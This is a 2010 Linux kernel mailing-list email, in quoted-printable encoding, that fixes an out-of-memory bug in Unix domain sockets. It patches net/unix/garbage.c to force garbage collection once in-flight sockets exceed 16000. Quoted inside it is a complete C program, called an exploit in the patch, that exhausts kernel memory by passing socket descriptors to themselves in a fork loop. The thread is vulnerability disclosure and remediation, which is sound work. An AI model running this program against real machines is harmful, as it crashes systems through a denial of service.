From: Eric Dumazet <eric.dumazet@gmail.com>
Subject: [PATCH] af_unix: limit unix_tot_inflight
Date: Wed, 24 Nov 2010 10:18:55 +0100
Message-ID: <1290590335.3464.24.camel@edumazet-laptop>
References: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
	 <1290553918.2866.80.camel@edumazet-laptop>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: QUOTED-PRINTABLE
Cc: LKML <linux-kernel@vger.kernel.org>,
	Andrew Morton <akpm@linux-foundation.org>,
	Eugene Teo <eugene@redhat.com>, netdev <netdev@vger.kernel.org>
To: Vegard Nossum <vegard.nossum@gmail.com>,
	David Miller <davem@davemloft.net>
Return-path: <linux-kernel-owner@vger.kernel.org>
In-Reply-To: <1290553918.2866.80.camel@edumazet-laptop>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

Le mercredi 24 novembre 2010 =C3=A0 00:11 +0100, Eric Dumazet a =C3=A9c=
rit :
> Le mardi 23 novembre 2010 =C3=A0 23:21 +0100, Vegard Nossum a =C3=A9c=
rit :
> > Hi,
> >=20
> > I found this program lying around on my laptop. It kills my box
> > (2.6.35) instantly by consuming a lot of memory (allocated by the
> > kernel, so the process doesn't get killed by the OOM killer). As fa=
r
> > as I can tell, the memory isn't being freed when the program exits
> > either. Maybe it will eventually get cleaned up the UNIX socket
> > garbage collector thing, but in that case it doesn't get called
> > quickly enough to save my machine at least.
> >=20
> > #include <sys/mount.h>
> > #include <sys/socket.h>
> > #include <sys/un.h>
> > #include <sys/wait.h>
> >=20
> > #include <errno.h>
> > #include <fcntl.h>
> > #include <stdio.h>
> > #include <stdlib.h>
> > #include <string.h>
> > #include <unistd.h>
> >=20
> > static int send_fd(int unix_fd, int fd)
> > {
> >         struct msghdr msgh;
> >         struct cmsghdr *cmsg;
> >         char buf[CMSG_SPACE(sizeof(fd))];
> >=20
> >         memset(&msgh, 0, sizeof(msgh));
> >=20
> >         memset(buf, 0, sizeof(buf));
> >         msgh.msg_control =3D buf;
> >         msgh.msg_controllen =3D sizeof(buf);
> >=20
> >         cmsg =3D CMSG_FIRSTHDR(&msgh);
> >         cmsg->cmsg_len =3D CMSG_LEN(sizeof(fd));
> >         cmsg->cmsg_level =3D SOL_SOCKET;
> >         cmsg->cmsg_type =3D SCM_RIGHTS;
> >=20
> >         msgh.msg_controllen =3D cmsg->cmsg_len;
> >=20
> >         memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
> >         return sendmsg(unix_fd, &msgh, 0);
> > }
> >=20
> > int main(int argc, char *argv[])
> > {
> >         while (1) {
> >                 pid_t child;
> >=20
> >                 child =3D fork();
> >                 if (child =3D=3D -1)
> >                         exit(EXIT_FAILURE);
> >=20
> >                 if (child =3D=3D 0) {
> >                         int fd[2];
> >                         int i;
> >=20
> >                         if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, =
fd) =3D=3D -1)
> >                                 goto out_error;
> >=20
> >                         for (i =3D 0; i < 100; ++i) {
> >                                 if (send_fd(fd[0], fd[0]) =3D=3D -1=
)
> >                                         goto out_error;
> >=20
> >                                 if (send_fd(fd[1], fd[1]) =3D=3D -1=
)
> >                                         goto out_error;
> >                         }
> >=20
> >                         close(fd[0]);
> >                         close(fd[1]);
> >                         goto out;
> >=20
> >                 out_error:
> >                         fprintf(stderr, "error: %s\n", strerror(err=
no));
> >                 out:
> >                         exit(EXIT_SUCCESS);
> >                 }
> >=20
> >                 while (1) {
> >                         pid_t kid;
> >                         int status;
> >=20
> >                         kid =3D wait(&status);
> >                         if (kid =3D=3D -1) {
> >                                 if (errno =3D=3D ECHILD)
> >                                         break;
> >                                 if (errno =3D=3D EINTR)
> >                                         continue;
> >=20
> >                                 exit(EXIT_FAILURE);
> >                         }
> >=20
> >                         if (WIFEXITED(status)) {
> >                                 if (WEXITSTATUS(status))
> >                                         exit(WEXITSTATUS(status));
> >                                 break;
> >                         }
> >                 }
> >         }
> >=20
> >         return EXIT_SUCCESS;
> > }
> >=20
> >=20
> > Vegard
> > --

Here is a patch to address this problem.

Thanks

[PATCH] af_unix: limit unix_tot_inflight

Vegard Nossum found a unix socket OOM was possible, posting an exploit
program.

My analysis is we can eat all LOWMEM memory before unix_gc() being
called from unix_release_sock(). Moreover, the thread blocked in
unix_gc() can consume huge amount of time to perform cleanup because of
huge working set.

One way to handle this is to have a sensible limit on unix_tot_inflight=
,
tested from wait_for_unix_gc() and to force a call to unix_gc() if this
limit is hit.

This solves the OOM and also reduce overall latencies, and should not
slowdown normal workloads.

Reported-by: Vegard Nossum <vegard.nossum@gmail.com>
Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com>
Cc: Andrew Morton <akpm@linux-foundation.org>
Cc: Eugene Teo <eugene@redhat.com>
---
 net/unix/garbage.c |    7 +++++++
 1 files changed, 7 insertions(+)

diff --git a/net/unix/garbage.c b/net/unix/garbage.c
index c8df6fd..40df93d 100644
--- a/net/unix/garbage.c
+++ b/net/unix/garbage.c
@@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_soc=
k *u)
 }
=20
 static bool gc_in_progress =3D false;
+#define UNIX_INFLIGHT_TRIGGER_GC 16000
=20
 void wait_for_unix_gc(void)
 {
+	/*
+	 * If number of inflight sockets is insane,
+	 * force a garbage collect right now.
+	 */
+	if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_GC && !gc_in_progress)
+		unix_gc();
 	wait_event(unix_gc_wait, gc_in_progress =3D=3D false);
 }
=20
